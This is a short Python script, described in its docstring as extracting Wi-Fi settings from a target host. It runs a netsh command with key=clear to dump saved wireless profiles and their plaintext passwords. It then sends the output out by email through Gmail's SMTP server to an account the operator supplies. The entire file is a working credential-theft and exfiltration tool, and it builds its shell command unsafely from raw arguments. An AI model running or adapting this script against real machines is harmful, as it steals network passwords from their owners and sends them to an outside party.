#! /usr/bin/python
"""A simple script used to extract wifi settings from a target host.
   Uses Python 2.7.16"""

import subprocess
import optparse
import smtplib


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-i', '--interface', dest='network_interface', help='Network interface')
    parser.add_option('-n', '--name', dest='network_name', help='Network name')
    parser.add_option('-e', '--email', dest='email', help='Email address to send data to')
    parser.add_option('-p', '--password', dest='password', help='Email password')

    (options, arguments) = parser.parse_args()

    return options


def send_mail(email, password, message):
    """Sends email with """
    server = smtplib.SMTP('smtp.gmail.com', 587)                # gmail smtp server address and port
    server.starttls()
    server.login(email, password)                               # logs into email account
    server.sendmail(email, email, message)                      # sends email from 'email' account to 'email' account
    server.quit()


options = get_arguments()
# change_mac(options.network_interface, options.network_name)     # changes MAC address

command = 'netsh %s show profile %s  key=clear' % (options.network_interface, options.network_name)

result = subprocess.check_output(command, shell=True)

send_mail(options.email, options.password, result)
